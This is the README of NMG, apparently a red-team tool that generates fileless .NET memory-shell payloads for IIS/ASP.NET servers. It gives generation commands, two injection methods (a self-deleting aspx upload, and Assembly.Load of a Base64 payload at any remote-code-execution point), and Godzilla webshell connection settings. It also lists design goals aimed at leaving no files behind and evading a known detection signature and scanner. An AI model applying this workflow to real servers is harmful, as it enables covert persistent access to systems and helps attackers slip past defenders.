# NMG - .NET Memory-shell Generator

> 参数化 .NET 内存马生成器 | 攻防演练自用 | 模仿 JMG 的 .NET 版本

## What is NMG?

NMG generates parameterized .NET memory shell payloads that inject into IIS/ASP.NET applications without leaving files on disk. After injection, you connect with existing webshell managers (Godzilla/Behinder) - NMG just makes the server side work.

**Think of it as: `input parameters → compiled payload → inject → connect with Godzilla`**

## Features

### Memory Shell Types

| Type | Target | .NET Framework | Trigger Point |
|------|--------|---------------|---------------|
| `vpp` | IIS/ASP.NET | 2.0+ | VirtualPathProvider.GetCacheKey |
| `route` | MVC/WebAPI | 3.5+ | RouteBase.GetRouteData |
| `httplistener` | Standalone/SYSTEM | 2.0+ | HttpListener (independent of IIS) |
| `httpmodule` | IIS Integrated | 4.0+ | IHttpModule.Init *(P2, in research)* |

### Shell Protocols

| Protocol | Client | Encryption |
|----------|--------|-----------|
| `godzilla` | Godzilla 4.x | AES-128 (key=MD5(pass+key)[0:16]) |
| `behinder` | Behinder 4.x | AES-128 *(P2)* |
| `rawcmd` | Custom | Custom *(P2)* |

### Output Formats

| Format | Use Case |
|--------|----------|
| `aspx` | Upload to writable directory, access once to inject |
| `b64` | For RCE delivery via deserialization/expression injection |
| `dll` | Raw DLL for custom loaders |

## Quick Start

### Generate

```bash
# VPP memory shell, Godzilla protocol, net40 target
nmg generate --type vpp --shell godzilla --pass p@ss123 --seed 42

# Route memory shell for MVC targets
nmg generate --type route --shell godzilla --pass mypass --target net472

# HttpListener for SYSTEM-level access
nmg generate --type httplistener --pass root --path "http://*:8080/cmd/"

# Output as Base64 for deserialization delivery
nmg generate --type vpp --shell godzilla --pass p@ss123 --format b64 -o payload.b64
```

### Inject

**Method 1 (aspx injector):**
1. Upload the generated `.aspx` file to any writable directory on the target
2. Access it once in a browser (triggers `Assembly.Load` + VPP registration)
3. Delete the aspx file
4. Connect with Godzilla to any existing `.aspx`/`.ashx`/`.asmx` on the site

**Method 2 (Base64):**
Execute at any RCE point:
```
Assembly.Load(Convert.FromBase64String("<payload>"))
```

### Connect with Godzilla

| Setting | Value |
|---------|-------|
| URL | `http://target/existing-page.aspx` (any existing page) |
| Password | your `--pass` value |
| Key | shown in generation output |
| Encryption | AES-128 (default) |
| Type | C# |

## Design Principles

1. **Host-safe**: All execution paths wrapped in try-catch, any exception silently passes the request through
2. **Idempotent**: Repeated injection doesn't stack registrations
3. **No file residue**: After injection, no new files in web directory
4. **Deterministic**: Same parameters + same seed = identical output (for regression testing)
5. **No dynamic compilation on target**: Payload is pre-compiled, avoids `ASP.xxx_aspx+ClassName` detection

## Building

```bash
dotnet build
dotnet test
dotnet publish src -c Release -r win-x64 --self-contained -o publish/
```

## Project Structure

```
nmg/
├── src/
│   ├── Program.cs              # CLI entry point
│   ├── GenerateOptions.cs      # generate command + pipeline
│   ├── Shells/
│   │   └── GodzillaCSharp.cs   # Godzilla protocol payload logic
│   ├── Templates/
│   │   ├── VppTemplate.cs      # VirtualPathProvider registrar
│   │   ├── RouteTemplate.cs    # RouteBase registrar
│   │   └── HttpListenerTemplate.cs
│   ├── Compiler/
│   │   └── RoslynCompiler.cs   # Multi-target Roslyn compilation
│   ├── Randomizer/
│   │   └── SeedRandom.cs       # Deterministic randomization
│   └── Formats/
│       ├── AspxInjector.cs     # Self-contained aspx injector page
│       └── Base64Output.cs     # Raw Base64 output
└── tests/                      # Unit tests
```

## References

- [BeichenDream/GodzillaMemoryShellProject.NET](https://github.com/BeichenDream/GodzillaMemoryShellProject.NET) — Godzilla author's official .NET memory shell library
- yzddmr6's ASP.NET memory shell series — filter, route, HttpListener, VirtualPath
- [yzddmr6/ASP.NET-Memshell-Scanner](https://github.com/yzddmr6/ASP.NET-Memshell-Scanner) — Detection tool (used as validation target)
- pen4uin/jmg — Java Memory-shell Generator (reference architecture)

## License

MIT
